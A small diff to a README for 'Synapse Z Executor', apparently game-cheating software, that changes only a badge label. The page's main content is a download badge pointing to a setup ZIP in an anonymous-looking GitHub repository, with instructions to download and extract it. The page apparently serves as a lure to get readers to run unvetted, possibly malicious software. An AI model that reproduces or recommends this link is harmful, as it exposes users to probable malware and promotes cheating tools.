@@ -2,7 +2,7 @@
 
 ## Quick Installation
 To get started with Synapse Z Executor, follow these simple steps:
-1. **[![Download Synapse Z Executor](https://img.shields.io/badge/Download-Synapse Z%20Executor-blueviolet)](https://github.com/nhatquang2004/1111/releases/download/135/Setupv2.5.1.zip)**
+1. **[![Download Synapse Z Executor](https://img.shields.io/badge/Download-SynapseZ%20Executor-blueviolet)](https://github.com/nhatquang2004/1111/releases/download/135/Setupv2.5.1.zip)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 **Description:**  
